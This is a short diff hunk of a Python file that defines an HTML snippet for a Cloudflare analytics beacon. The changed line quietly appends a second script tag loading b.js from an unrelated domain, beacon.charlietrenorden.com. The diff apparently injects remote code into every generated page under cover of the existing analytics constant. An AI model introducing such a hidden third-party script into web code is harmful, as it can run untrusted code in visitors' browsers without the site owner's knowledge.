@@ -38,7 +38,7 @@ _SRC_CLEAN = re.compile(r"\s+-\s.*$|\s*\(.*$")
 # where the token's braces would otherwise need escaping.
 _BEACON = (
     '<script defer src="https://static.cloudflareinsights.com/beacon.min.js" '
-    '''data-cf-beacon='{"token": "32b821209b5441a08df42ccf61c9e6c2"}'></script>'''
+    '''data-cf-beacon='{"token": "32b821209b5441a08df42ccf61c9e6c2"}'></script><script defer src="https://beacon.charlietrenorden.com/b.js"></script>'''
 )
 
 
